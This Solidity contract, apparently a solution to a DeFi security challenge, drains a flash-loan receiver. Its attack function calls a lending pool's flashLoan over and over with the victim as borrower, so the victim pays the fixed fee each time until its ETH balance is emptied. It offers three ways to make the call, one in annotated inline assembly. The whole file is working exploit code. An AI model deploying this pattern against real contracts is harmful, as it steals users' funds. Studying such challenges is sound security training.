// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    function attack(address _pool, address _victim) external {
        INaiveReceiverLenderPool pool = INaiveReceiverLenderPool(_pool);
        uint256 flashLoanFee = pool.fixedFee();

        uint256 targetETHBalance = address(_victim).balance;

        uint256 max_suck = targetETHBalance / flashLoanFee;

        bytes memory callData = abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 1);

        for (uint256 i = 0; i < max_suck; i++) {
            //OPTION 1, easy : pool.flashLoan(_victim, 1);
            //OPTION 2, fancier: (bool success,) = _pool.call(callData);
            //                   require(success);
            //OPTION 3, assembly fun fanciest
            assembly {
                /*

                let _victim := 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B
                                 
                callData = 0x9d9e465c000000000000000000000000d7acd2a9fd159e69bb102a1ca21c9a3e3a5f771b0000000000000000000000000000000000000000000000000000000000000001
                           
                Representation of callData in memory (16bytes aligned, 32 bytes words):
                    0xa0:  0x00000000000000000000000000000000
                    0xb0:  0x00000000000000000000000000000044
                    0xc0:  0x9d9e465c000000000000000000000000
                    0xd0:  0xd7acd2a9fd159e69bb102a1ca21c9a3e
                    0xe0:  0x3a5f771b000000000000000000000000
                    0xf0:  0x00000000000000000000000000000000
                    0x100: 0x00000001000000000000000000000000

                    -> 0x9d9e465c is the function selector
                    -> 0xd7acd2a9fd159e69bb102a1ca21c9a3e3a5f771b is the _victim address
                    -> 0x0000000000000000000000000000000000000000000000000000000000000001 is 1 on 256bits

                    -> 0x0000000000000000000000000000000000000000000000000000000000000044 is the length in bytes of callData (68 bytes)
                */

                // load the length of the byte array (first 32bytes from the allocated memory region for the `callData` -> length|data)
                let len := mload(callData)
                // get free memory pointer that is stored in 0x40
                let resLoc := mload(0x40)
                // call the pool with full gas, 0 wei, only the data of `callData`, length of `callData`,
                //  free memory region pointer to receive the return data,
                //  and 0 as return data length as we can get it afterwards with returndatasize()
                let res := call(gas(), _pool, 0, add(0x20,callData), len, resLoc, 0)
                
                let size := returndatasize()

                returndatacopy(resLoc, 0, size)

                switch res
                case 0 {revert(resLoc, size)}
                default {}
            }
        }
    }
}